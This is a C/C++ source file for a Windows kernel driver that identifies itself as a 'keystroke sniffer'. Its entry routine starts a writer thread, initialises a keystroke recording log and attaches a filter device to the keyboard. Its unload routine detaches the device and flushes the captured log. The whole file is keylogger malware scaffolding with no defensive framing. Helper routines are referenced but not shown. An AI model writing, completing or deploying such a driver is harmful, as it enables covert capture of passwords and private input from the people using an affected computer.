#include <main.h>

Log Recording;
bool WriteSignal = false;
bool Unload = false;

void DriverUnload(
	_In_ PDRIVER_OBJECT DriverObject
)
{
	Unload = true;
	if (FilterDevice)
		DetachDevice(FilterDevice);

	Recording.Write();
	ExWaitForRundownProtectionRelease(&PendingIrps);
	ExWaitForRundownProtectionRelease(&WriterRef);
	DbgPrint("[*] keystroke sniffer unloaded\n");
}


EXTERN_C NTSTATUS DriverEntry(
	_In_ PDRIVER_OBJECT DriverObject,
	_In_ PUNICODE_STRING RegistryPath
)
{
	UNREFERENCED_PARAMETER(RegistryPath);
	NTSTATUS status = STATUS_SUCCESS;
	HANDLE WriterHandle;

	DriverObject->DriverUnload = DriverUnload;
	ExInitializeRundownProtection(&WriterRef);
	Recording.Init();
	status = PsCreateSystemThread(&WriterHandle, THREAD_ALL_ACCESS, NULL, NULL, NULL, Writer, NULL);
	if (!NT_SUCCESS(status))
	{
		DbgPrint("[*] failed to create writer thread\n");
		return status;
	}
	status = AttachDevice(DriverObject);
	if (!NT_SUCCESS(status))
	{
		DbgPrint("[*] failed to attach to keyboard\n");
		return status;
	}


	DbgPrint("[*] keystroke sniffer loaded\n");



	return status;

}